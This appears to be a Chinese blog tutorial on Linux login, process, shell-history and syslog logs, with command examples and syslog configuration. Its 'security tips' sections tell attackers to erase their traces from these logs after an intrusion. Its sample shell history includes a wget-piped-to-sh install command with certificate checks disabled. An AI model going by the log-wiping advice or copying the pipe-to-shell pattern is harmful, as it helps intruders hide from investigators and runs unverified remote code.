<h3 id="1-7-finger-命令"><a href="#1-7-finger-命令" class="headerlink" title="1.7 finger 命令"></a>1.7 <code>finger</code> 命令</h3><p>该命令输出用户的 <strong>注册名称</strong>、<strong>真实名称</strong>、<strong>终端名</strong>、<strong>写状态</strong>、<strong>停滞时间</strong>、<strong>登录时间</strong>、<strong>办公地点</strong>、<strong>办公电话</strong> 等信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜ finger</div><div class="line">Login     Name       Tty      Idle  Login Time   Office     Office Phone   Host</div><div class="line">root      root       tty1     2:25  Dec 29 16:34</div><div class="line">root      root       pts/0          Dec 29 15:48                           (ses-254-254.geology.ohio-state.edu)</div><div class="line">root      root       pts/1      37  Dec 29 16:57                           (ses-254-254.geology.ohio-state.edu)</div></pre></td></tr></table></figure></p>
<h3 id="1-8-uptime-命令"><a href="#1-8-uptime-命令" class="headerlink" title="1.8 uptime 命令"></a>1.8 <code>uptime</code> 命令</h3><p>该命令输出系统至今的运行时间（<code>-p</code> 选项以可读性较好的形式输出）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜ uptime</div><div class="line"> 19:05:17 up 3 days,  4:21,  3 users,  load average: 0.00, 0.01, 0.05</div><div class="line">➜ uptime -p</div><div class="line">up 3 days, 4 hours, 21 minutes</div></pre></td></tr></table></figure></p>
<h3 id="1-9-lastlog-命令"><a href="#1-9-lastlog-命令" class="headerlink" title="1.9 lastlog 命令"></a>1.9 <code>lastlog</code> 命令</h3><p><code>/var/log/lastlog</code> 文件在每次有用户登录时被查询。可以使用 <code>lastlog</code> 命令来检查某特定用户上次登录的时间，并格式化输出上次登录日志 <code>/var/log/lastlog</code> 的内容。它根据 <code>UID</code> 排序显示登录名、端口号（tty）和上次登录时间。如果一个用户从未登录过，lastlog显示 <code>Never logged(从未登录过)</code>。注意需要<strong>以 <code>root</code> 运行该命令</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">➜ lastlog</div><div class="line">用户名           端口     来自             最后登陆时间</div><div class="line">root            pts/1                    一 12月 29 17:00:01 +0800 2014</div><div class="line">bin                                      **从未登录过**</div><div class="line">daemon                                   **从未登录过**</div><div class="line">adm                                      **从未登录过**</div><div class="line">lp                                       **从未登录过**</div><div class="line">sync                                     **从未登录过**</div><div class="line">shutdown                                 **从未登录过**</div><div class="line">halt                                     **从未登录过**</div><div class="line">mail                                     **从未登录过**</div><div class="line">operator                                 **从未登录过**</div><div class="line">games                                    **从未登录过**</div><div class="line">ftp                                      **从未登录过**</div><div class="line">nobody                                   **从未登录过**</div><div class="line">dbus                                     **从未登录过**</div><div class="line">apache                                   **从未登录过**</div><div class="line">polkitd                                  **从未登录过**</div><div class="line">avahi                                    **从未登录过**</div><div class="line">avahi-autoipd                            **从未登录过**</div><div class="line">libstoragemgmt                           **从未登录过**</div><div class="line">abrt                                     **从未登录过**</div><div class="line">tomcat                                   **从未登录过**</div><div class="line">pcp                                      **从未登录过**</div><div class="line">postfix                                  **从未登录过**</div><div class="line">sshd                                     **从未登录过**</div><div class="line">ntp                                      **从未登录过**</div><div class="line">chrony                                   **从未登录过**</div><div class="line">oprofile                                 **从未登录过**</div><div class="line">tcpdump                                  **从未登录过**</div><div class="line">saslauth                                 **从未登录过**</div><div class="line">mysql                                    **从未登录过**</div><div class="line">usbmuxd                                  **从未登录过**</div></pre></td></tr></table></figure></p>
<blockquote>
<p>另外，可一加一些参数，例如:<br><code>last -u 102</code> 将报告 <code>UID</code> 为 <code>102</code> 的用户；<br><code>last -t 7</code> 表示限制上一周的报告。</p>
</blockquote>
<h3 id="1-10-var-log-secure-文件"><a href="#1-10-var-log-secure-文件" class="headerlink" title="1.10 /var/log/secure 文件"></a>1.10 <code>/var/log/secure</code> 文件</h3><p>记录登入系统存取数据的文件，例如 <code>pop3/ssh/telnet/ftp</code> 等都会被记录，我们可以利用此文件找出不安全的登录I该文件可以直接用编辑器打开查看，也可以用Linux中常见的文本处理工具如<code>cat/wc/more/head/tail/awk/sed</code> 等进行分析处理。下面是该文件的部分内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Dec 29 15:48:43 localhost sshd[13053]: Accepted password for root from 140.254.254.254 port 9891 ssh2</div><div class="line">Dec 29 15:48:44 localhost sshd[13053]: pam_unix(sshd:session): session opened for user root by (uid=0)</div><div class="line">Dec 29 16:30:41 localhost unix_chkpwd[15004]: password check failed for user (root)</div><div class="line">Dec 29 16:30:41 localhost login: pam_unix(login:auth): authentication failure; logname=LOGIN uid=0 euid=0 tty=tty1 ruser= rhost=  user=root</div><div class="line">Dec 29 16:30:41 localhost login: pam_succeed_if(login:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</div><div class="line">Dec 29 16:30:43 localhost login: FAILED LOGIN 1 FROM tty1 FOR root, Authentication failure</div><div class="line">Dec 29 16:30:51 localhost unix_chkpwd[15013]: password check failed for user (root)</div><div class="line">Dec 29 16:30:51 localhost login: pam_succeed_if(login:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</div></pre></td></tr></table></figure>
<h3 id="1-11-安全-Tips"><a href="#1-11-安全-Tips" class="headerlink" title="1.11 安全 Tips"></a>1.11 安全 Tips</h3><p>这类日志无论在攻击和防守时都是至关重要的。从防护角度来说，假如系统遭到了黑客入侵，这类日志能辅助排查黑客登录系统相关的信息。从黑客攻击的角度来说，如果成功入侵了一个 Linux 系统的主机，在后渗透环节擦除相关日志时，一定要擦除上面这些日志中自己可能留下的痕迹。</p>
<h2 id="2-进程监控日志"><a href="#2-进程监控日志" class="headerlink" title="2. 进程监控日志"></a>2. 进程监控日志</h2><h3 id="2-1-系统进程监控"><a href="#2-1-系统进程监控" class="headerlink" title="2.1 系统进程监控"></a>2.1 系统进程监控</h3><p>UNIX 可以跟踪每个用户运行的每条命令，如果想知道昨晚弄乱了哪些重要的文件，进程统计子系统可以告诉你。它还对跟踪一个侵入者有帮助。与连接时间日志不同，进程统计子系统缺省不激活，它必须手动启动。在 Linux 系统中启动进程统计使用 <code>accton</code> 命令，必须用 <code>root</code> 身份来运行。<code>accton</code> 命令的形式 <code>accton file</code>，<code>file</code> 必须先存在。先使用 <code>touch</code> 命令来创建 <code>pacct</code> 文件：<code>touch /var/log/pacct</code>，然后运行 <code>accton /var/log/pacct</code> 。一旦 <code>accton</code> 被激活，就可以使用 <code>lastcomm</code> 命令监测系统中任何时候执行的命令。若要关闭统计，可以使用不带任何参数的 <code>accton</code> 命令。</p>
<p><code>lastcomm</code> 命令报告以前执行的文件。不带参数时，<code>lastcomm</code> 命令显示当前统计文件生命周期内纪录的所有命令的有关信息。包括 <strong>命令名</strong>、<strong>用户</strong>、<strong>tty</strong>、<strong>命令花费的CPU时间</strong>和<strong>一个时间戳</strong>。如果系统有许多用户，输入则可能很长：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">➜ accton /var/account/pacct //开启进程统计日志监控</div><div class="line">➜</div><div class="line">➜ lastcomm -f /var/log/pacct</div><div class="line">zsh               F    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">git                    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">git                    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">git                    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">zsh               F    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">git                    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">git                    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">git                    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">zsh               F    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">git                    root     pts/0      0.00 secs Tue Dec 30 10:36</div><div class="line">➜</div><div class="line">➜ accton off //关闭进程统计日志监控</div></pre></td></tr></table></figure>
<h3 id="2-2-Shell-命令记录"><a href="#2-2-Shell-命令记录" class="headerlink" title="2.2 Shell 命令记录"></a>2.2 Shell 命令记录</h3><h4 id="2-2-1-命令记录文件"><a href="#2-2-1-命令记录文件" class="headerlink" title="2.2.1 命令记录文件"></a>2.2.1 命令记录文件</h4><hr>
<p>现在大部分 Linux/Unix 系统甚至 Mac OSX ，默认 Shell 都是 <code>bash</code>，<code>bash</code> 会在每个用户主目录里生成一个 <code>.bash_history</code> 文件，其中记录着用户用 <code>bash</code> 执行过的 Shell 命令，下面是该文件的部分内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">startx</div><div class="line">ls</div><div class="line">php version</div><div class="line">php --help</div><div class="line">java -c</div><div class="line">java</div><div class="line">ifconfig</div><div class="line">vi /etc/sysconfig/network-scripts/</div><div class="line">vi /etc/sysconfig/network-scripts/ifcfg-ens160</div><div class="line">ls</div><div class="line">ifconfig</div><div class="line">vi /etc/sysconfig/network-scripts/ifcfg-ens160</div><div class="line">vi /etc/sysconfig/grub</div><div class="line">grub2-mkconfig --help</div><div class="line">grub2-mkconfig -o /boot/grub2/grub.cfg</div><div class="line">service network restart</div><div class="line">ifconfig</div><div class="line">vi /etc/sysconfig/network-scripts/ifcfg-ens160</div></pre></td></tr></table></figure></p>
<p>如果系统默认 Shell 不是 <code>bash</code>，假如是 <code>ZSh</code> 呢？ <code>ZSh</code> 会在用户主目录下默认生成一个 <code>zsh</code> 自己的命令历史记录文件 <code>.zsh_history</code> ，这个文件记录着用户用 <code>zsh</code> 运行的 Shell 命令。不同的是， <code>zsh</code> 的命令历史记录文件中还记录了对应命令执行的时间戳，下面是该文件的部分内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">: 1418369144:0;wget -O .zshrc http://git.grml.org/f/grml-etc-core/etc/zsh/zshrc &amp;&amp; source ~/.zshrc</div><div class="line">: 1418369204:0;vim conf/httpd.conf</div><div class="line">: 1418369266:0;la /</div><div class="line">: 1418369314:0;wget http://sourceforge.net/projects/zsh/files/zsh/5.0.7/zsh-5.0.7.tar.bz2/download</div><div class="line">: 1418369735:0;rm -rf .oh-my-zsh</div><div class="line">: 1418369738:0;wget --no-check-certificate http://install.ohmyz.sh -O - | sh</div><div class="line">: 1418369765:0;zsh</div><div class="line">: 1418369788:0;vim .zshrc</div><div class="line">: 1418369931:0;cd /etc/</div><div class="line">......</div></pre></td></tr></table></figure></p>
<h4 id="2-2-2-history-命令"><a href="#2-2-2-history-命令" class="headerlink" title="2.2.2 history 命令"></a>2.2.2 <code>history</code> 命令</h4><hr>
<p>其实，Linux中有一个命令叫做 <code>history</code> ，它会列出 <strong>系统默认Shell</strong> 最近执行的1000条命令，并给日志文件中的每条命令进行编号。</p>
<p>如果系统 <strong>默认 Shell</strong> 是 <code>bash</code> ，该命令会读取当前用户主目录下的 <code>.bash_history</code> 文件中的内容；虽然 <code>man history</code> 显示该命令其实是 <code>bash</code> 的一个内置命令模块，但如果系统 <strong>默认 Shell</strong> 是 <code>zsh</code> ，该命令则会读取 <code>.zsh_history</code> 文件，并且不会显示该文件中的时间戳信息。下面是该命令的部分输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">➜ history| more</div><div class="line">1  wget -O .zshrc http://git.grml.org/f/grml-etc-core/etc/zsh/zshrc &amp;&amp; source ~/.zshrc</div><div class="line">2  vim conf/httpd.conf</div><div class="line">3  la /</div><div class="line">4  wget http://sourceforge.net/projects/zsh/files/zsh/5.0.7/zsh-5.0.7.tar.bz2/download</div><div class="line">5  rm -rf .oh-my-zsh</div><div class="line">6  wget --no-check-certificate http://install.ohmyz.sh -O - | sh</div><div class="line">7  zsh</div><div class="line">8  vim .zshrc</div><div class="line">9  cd /etc/</div><div class="line">10  cd</div><div class="line">11  cd .oh-my-zsh</div><div class="line">12  vim themes/robbyrussell.zsh-theme</div><div class="line">13  cd themes</div><div class="line">14  cp robbyrussell.zsh-theme robbyrussell.zsh-theme_bak</div><div class="line">15  ls</div><div class="line">16  vim robbyrussell.zsh-theme</div><div class="line">17  scp --h</div><div class="line">18  scp root@.140.0.105.2:/root/.oh-my-zsh/themes/robbyrussell.zsh-theme ./robby.bak</div><div class="line">19  scp root@140.0.105.2:/root/.oh-my-zsh/themes/robbyrussell.zsh-theme ./robby.bak</div><div class="line">20  vim robby.bak</div><div class="line">21  vim robbyrussell.zsh-theme</div><div class="line">22  cd</div><div class="line">23  source .zshrc</div><div class="line">24  ls</div><div class="line">25  cd .oh-my-zsh</div><div class="line">26  cd themes</div><div class="line">27  rm robby.bak robbyrussell.zsh-theme_bak</div><div class="line">28  ps aux | grep firewall</div></pre></td></tr></table></figure></p>
<p><code>history</code> 命令还有些 <em>小巧</em> 的用法。它对日志文件中的命令进行了编号，利用这些编号可以方便地执行某些命令，比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ !31   //执行第31条命令</div><div class="line">➜ !!    //执行上一条命令</div></pre></td></tr></table></figure></p>
<h4 id="2-2-3-安全-Tips"><a href="#2-2-3-安全-Tips" class="headerlink" title="2.2.3 安全 Tips"></a>2.2.3 安全 Tips</h4><p>Shell 命令记录日志，包含了大量的敏感操作记录（看上面的示例就能发现）。从防护的角度来说，如果Linux系统主机被入侵，这些日志文件会记录下黑客登录主机后进行的操作（如果日志没被抹去的话）。从攻击的角度来说，一是这些日志能给黑客提供大量的敏感信息，方便黑客进行快速渗透；二是黑客所有的操作命令也会被记录到日志中，后渗透攻击阶段要记得抹除这些攻击日志。</p>
<h2 id="3-系统日志（syslog-rsyslog）"><a href="#3-系统日志（syslog-rsyslog）" class="headerlink" title="3. 系统日志（syslog/rsyslog）"></a>3. 系统日志（syslog/rsyslog）</h2><p><code>syslog</code> 是一个历史悠久的日志系统，几乎所有的UNIX和Linux操作系统都是采用 <code>syslog</code> 进行系统日志的管理和配置。Linux 系统内核和许多程序会产生各种错误信息、警告信息和其他的提示信息。这些信息对管理员了解系统的运行状态是非常有用的，所以应该把它们写到日志文件中去。而执行这个过程的程序就是 <code>syslog</code> 。<code>syslog</code> 可以根据信息的来源以及信息的重要程度将信息保存到不同的日志文件中，例如，为了方便查阅，可以把内核信息与其他信息分开，单独保存到一个独立的日志文件中。在默认的 <code>syslog</code> 配置下，日志文件通常都保存在 <code>/var/log</code> 目录下。<code>syslog</code> 的守护进程为 <code>syslogd</code> ，系统启动时，默认会自动运行 <code>syslogd</code> 守护进程。</p>
<p><code>syslog</code> 已被许多日志函数采纳，它用在许多保护措施中。任何程序都可以通过 <code>syslog</code> 记录事件。<code>syslog</code> 可以记录系统事件，可以写到一个文件或设备中，或给用户发送一个信息。它能记录本地事件或通过网络记录另一个主机上的事件。</p>
<p><code>syslog</code> 设备依据两个重要的文件：<code>/etc/syslogd（守护进程）</code> 和 <code>/etc/syslog.conf</code> 配置文件。习惯上，多数 <code>syslog</code> 信息被写到 <code>/var/adm</code> 或 <code>/var/log</code> 目录下的信息文件中。一个典型的 <code>syslog</code> 记录包括生成程序的名字和一个文本信息。它还包括一个设备和一个优先级范围（但不在日志中出现）。</p>
<p>Linux 系统日志配置机器存放位置大致如下图所示：<br><img src="http://img.blog.csdn.net/20130919161257234?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2hhb2ZhbndlaQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p>
<p>而现在，<code>syslog</code> 有了一个多线程升级版：<code>rsyslog</code>，它比 <code>syslog</code> 功能更强大也更高效，<code>CentOS7</code> 默认的系统日志服务就是<code>rsyslog</code>。它的基础功能与 <code>syslog</code> 一样，配置的方法与里面的概念也无二致，不同的是，其配置文件变成了 <code>/etc/rsyslog.conf</code>。<strong>本小节依然以 <code>syslog</code> 为例讲解</strong>。</p>
<h3 id="3-1-syslog-配置"><a href="#3-1-syslog-配置" class="headerlink" title="3.1 syslog 配置"></a>3.1 syslog 配置</h3><p><code>/etc/syslog.conf</code> 根据如下的格式定义规则：<code>facility.level action</code> ，即<br><code>设备.优先级 动作</code> 。<code>facility.level</code> 字段也被称为 <code>seletor</code>（选择条件），<strong>选择条件</strong> 和 <strong>动作</strong> 之间用空格或 <code>tab</code> 分割开；<code>facility</code> 可以理解成日志对应的类型；<code>action</code> 可以理解为日志的处理方式。</p>
<h4 id="3-1-1-facility"><a href="#3-1-1-facility" class="headerlink" title="3.1.1 facility"></a>3.1.1 facility</h4><p><code>facility</code> 定义日志消息的<strong>范围</strong> 或 <strong>种类</strong>，其可使用的 <code>key</code>有一下几种：</p>
<blockquote>
<ul>
<li><strong>auth</strong> ——  由 <code>pam_pwdb</code> 报告的认证活动，记录认证系统 <code>login</code>、<code>su</code>、<code>getty</code> 等的活动信息；</li>
<li><strong>authpriv</strong> —— 包括特权信息如用户名在内的认证活动，只登录到所选择的单个用户可读的文件中；</li>
<li><strong>cron</strong> － 与 <code>cron</code> 和 <code>at</code> 有关的计划任务信息；</li>
<li><strong>daemon</strong> －与 <code>inetd</code> 守护进程有关的后台进程信息；</li>
<li><strong>kern</strong> － 内核信息，首先通过 <code>klogd</code> 传递；</li>
<li><strong>lpr</strong> － 与打印服务有关的信息；</li>
<li><strong>mail</strong> － 与电子邮件有关的信息；</li>
<li><strong>mark</strong> － <code>syslog</code> 内部功能用于生成时间戳；</li>
<li><strong>news</strong> － 来自新闻服务器的信息；</li>
<li><strong>syslog</strong> － 由 <code>syslog</code> 生成的信息；</li>
<li><strong>user</strong> － 由用户程序生成的信息；</li>
<li><strong>uucp</strong> －由 <strong>uucp</strong> 生成的信息；</li>
<li><strong>local0~local7</strong> －与自定义程序使用。</li>
</ul>
</blockquote>
<p><code>*</code> 通配符代表除了 <code>mark</code> 以外的所有功能。除 <code>mark</code> 为内部使用外，还有 <code>security</code> 为一个旧的 <code>key</code> 定义，等同于 <code>auth</code> ，已经不再建议使用。</p>
<h4 id="3-1-2-level"><a href="#3-1-2-level" class="headerlink" title="3.1.2 level"></a>3.1.2 level</h4><p><code>level</code> 定义消息的紧急程度，共有8个级别。按严重程度由高到低顺序排列为：</p>
<blockquote>
<ul>
<li><strong>emerg</strong> － 该系统不可用，等同 <strong><code>panic</code></strong>；</li>
<li><strong>alert</strong> － 需要立即被修改的条件；</li>
<li><strong>crit</strong> － 阻止某些工具或子系统功能实现的错误条件；</li>
<li><strong>err</strong> － 阻止工具或某些子系统部分功能实现的错误条件，等同 <strong>error</strong>；</li>
<li><strong>warning</strong> － 预警信息，等同 <strong>warn</strong>；</li>
<li><strong>notice</strong> － 具有重要性的普通条件；</li>
<li><strong>info</strong> －提供信息的消息；</li>
<li><strong>debug</strong> － 不包含函数条件或问题的其他信息；</li>
<li><strong>none</strong> － 没有重要级，通常用于排错。</li>
</ul>
</blockquote>
<p>通配符 <code>*</code> 表示所有级别，除了 <strong>none</strong> 。其中 <code>panic</code> 、 <code>error</code> 、 <code>warn</code> 均为旧的标识符，不再建议使用。</p>
<p>在定义 <code>level</code> 级别的时候，需要注意两点： </p>
<ol>
<li>优先级是由应用程序在编程的时候已经决定的，除非修改源码再编译，否则不能改变消息的优先级；</li>
<li>低的优先级包含高优先级，例如，为某个应用程序定义 <code>info</code> 的日志导向，则涵盖 <code>notice</code> 、 <code>warning</code> 、 <code>err</code> 、 <code>crit</code> 、 <code>alert</code> 、 <code>emerg</code> 等消息。（除非使用 <code>=</code> 号定义）</li>
</ol>
<h4 id="3-1-3-selector"><a href="#3-1-3-selector" class="headerlink" title="3.1.3 selector"></a>3.1.3 selector</h4><p>通过点号 <code>.</code> 把 <code>facility</code> 和 <code>level</code> 连接在一起则成为 <code>selector（选择条件）</code>。可以使用分号 <code>;</code> 同时定义多个选择条件。也支持三个修饰符：</p>
<blockquote>
<p><strong><code>*</code></strong> － 所有日志信息；<br><strong><code>=</code></strong> － 等于，即仅包含本优先级的日志信息；<br><strong><code>!</code></strong> － 不等于，本优先级日志信息除外；</p>
</blockquote>
<h4 id="3-1-4-action"><a href="#3-1-4-action" class="headerlink" title="3.1.4 action"></a>3.1.4 action</h4><p>由前面选择条件定义的日志信息，可执行下面的动作：</p>
<blockquote>
<p><strong>file</strong> － 指定日志文件的绝对路径；<br><strong>terminal</strong> 或 <strong>print</strong> － 发送到串行或并行设备标志符，例如 <code>/dev/ttyS2</code> ；<br><strong>@host</strong> － 远程的日志服务器；<br><strong>username</strong> － 发送信息到本机的指定用户信息窗口中，但该用户必须已经登录到系统中；<br><strong>named pipe</strong> － 发送到预先使用 <code>mkfifo</code> 命令来创建的 <code>FIFO</code> 文件的绝对路径※注意，不能通过 <code>|/var/xxx.sh</code> 方式导向日志到其他脚本中处理。</p>
</blockquote>
<h4 id="3-1-5-配置举例"><a href="#3-1-5-配置举例" class="headerlink" title="3.1.5 配置举例"></a>3.1.5 配置举例</h4><p>上面详细讲解了 <code>syslog</code> 配置文件 <code>/etc/syslog.conf</code> 里核心的配置方法，下面举几个例子说明一下配置项及其意义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#把除 邮件、新闻、授权信息、计划任务信息等意外的所有 `info` 类消息都存入 /var/log/messages 文件</div><div class="line">*.info;mail.none;news.none;authpriv.none;cron.none /var/log/messages</div><div class="line"></div><div class="line">#把邮件、新闻组中仅 info 消息写入info文件，其他信息不写入</div><div class="line">mail,news.=info /var/adm/info</div><div class="line"></div><div class="line">#把邮件除 info 消息的所有消息存入 mail 文件</div><div class="line">mail.*;mail.!=info /var/adm/mail</div><div class="line"></div><div class="line">#仅把邮件的通知性消息发送到t ty12 终端设备</div><div class="line">mail.=info /dev/tty12</div><div class="line"></div><div class="line">#如果 root 和 jiayu 用户已经登录到系统，则把所有紧急信息通知他们</div><div class="line">*.alert root,joey</div><div class="line"></div><div class="line">#把所有信息都导向到 jiayu 主机（通过 /etc/hosts 或 dns 解析其IP地址）※注意：每条消息均会经过所有规则的，并不是唯一匹配的。</div><div class="line">*.* @jiayu</div></pre></td></tr></table></figure>
<p>也就是说，假设 <code>mail.=info</code> 信息通过上面范例中定义的规则时，<code>/var/adm/info</code>、<code>/var/adm/mail</code>、<code>/dev/tty12</code>，甚至 <strong>jiayu</strong> 主机都会收到相同的信息。这样看上去比较烦琐，但可以带来的好处就是保证了信息的完整性，可供不同地方进行分析。</p>
<h3 id="3-2-messages-日志"><a href="#3-2-messages-日志" class="headerlink" title="3.2 messages 日志"></a>3.2 messages 日志</h3><p><code>/var/log/messages</code>，是核心系统日志文件。它包含了系统启动时的引导信息，以及系统运行时的其他状态消息，比如 <code>mail</code> ， <code>cron</code> ， <code>daemon</code> <code>，kern</code> 和 <code>auth</code> ，甚至 <code>iptables</code> 和 <code>SELinux</code> 和 <code>DHCP</code> 服务日志，这也是它被称为杂货铺的原因。通常，该文件时在做故障诊断时首先要查看的文件，大家一般都喜欢用以下命令看最后十条日志：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tail -n10 /var/log/messages</div></pre></td></tr></table></figure></p>
<p>该文件以用户易懂的格式明文保存文件，可以用常见的 Linux 文件处理命令来分析处理其中的日志内容。</p>
<h3 id="3-3-dmesg"><a href="#3-3-dmesg" class="headerlink" title="3.3 dmesg"></a>3.3 dmesg</h3><p><code>dmesg</code> 提供了一个简单的方法查看系统启动信息。当 Linux 启动的时候，内核的信息被存入内核 <code>ring</code> 缓存和日志文件 <code>/var/log/dmesg</code> 当中，<code>dmesg</code> 可以显示缓存中的内容。默认情况下，<code>dmesg</code> 打印内容到屏幕上面，当然你可以重定向输出到一个文件。如果硬件损坏的话，在 <code>dmesg</code> 日志里是有显示的，可用以下命令来查看 <code>dmesg | grep error</code> 。</p>
<p>正常状态下，也可以用 <code>dmesg</code> 命令查看最后一次系统引导的日志，下面是部分输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">➜ dmesg| more</div><div class="line">[    0.000000] Initializing cgroup subsys cpuset</div><div class="line">[    0.000000] Initializing cgroup subsys cpu</div><div class="line">[    0.000000] Initializing cgroup subsys cpuacct</div><div class="line">[    0.000000] Linux version 3.10.0-123.13.2.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.2 20140120 (Red Hat 4.8.2-16) (GCC) ) #1 SMP Thu Dec 18 14:09:13 UTC 2014</div><div class="line">[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-3.10.0-123.13.2.el7.x86_64 root=/dev/mapper/centos-root ro rd.lvm.lv=centos/swap vconsole.font=latarcyrheb-sun16 net.ifnames=0 biosdevname=0</div><div class="line"> rd.lvm.lv=centos/root crashkernel=auto vconsole.keymap=us rhgb quiet LANG=zh_CN.UTF-8</div><div class="line">[    0.000000] Disabled fast string operations</div><div class="line">[    0.000000] e820: BIOS-provided physical RAM map:</div><div class="line">[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009f7ff] usable</div><div class="line">[    0.000000] BIOS-e820: [mem 0x000000000009f800-0x000000000009ffff] reserved</div><div class="line">[    0.000000] BIOS-e820: [mem 0x00000000000ca000-0x00000000000cbfff] reserved</div><div class="line">[    0.000000] BIOS-e820: [mem 0x00000000000dc000-0x00000000000fffff] reserved</div><div class="line">[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000003feeffff] usable</div><div class="line">[    0.000000] BIOS-e820: [mem 0x000000003fef0000-0x000000003fefefff] ACPI data</div><div class="line">[    0.000000] BIOS-e820: [mem 0x000000003feff000-0x000000003fefffff] ACPI NVS</div><div class="line">[    0.000000] BIOS-e820: [mem 0x000000003ff00000-0x000000003fffffff] usable</div><div class="line">......</div></pre></td></tr></table></figure></p>
<h3 id="3-4-日志转储"><a href="#3-4-日志转储" class="headerlink" title="3.4 日志转储"></a>3.4 日志转储</h3><h4 id="3-4-1-简介"><a href="#3-4-1-简介" class="headerlink" title="3.4.1 简介"></a>3.4.1 简介</h4><p>系统工作到了一定时间后，系统日志文件的内容随着时间和访问量的增加而越来越多，日志文件也越来越大。而且当日志文件超过系统控制范围时候，还会对系统性能造成影响。转储方式可以设为<strong>每年转储</strong>、<strong>每月转储</strong>、<strong>每周转储</strong>、达到一定大小转储。在 Linux 系统，经常使用 <code>logrotate</code> 工具进行日志转储，结合 <code>cron</code> 计划任务，可以轻松实现日志文件的转储。转储方式的设置由 <code>/etc/logrotate.conf</code> 配置文件控制。</p>
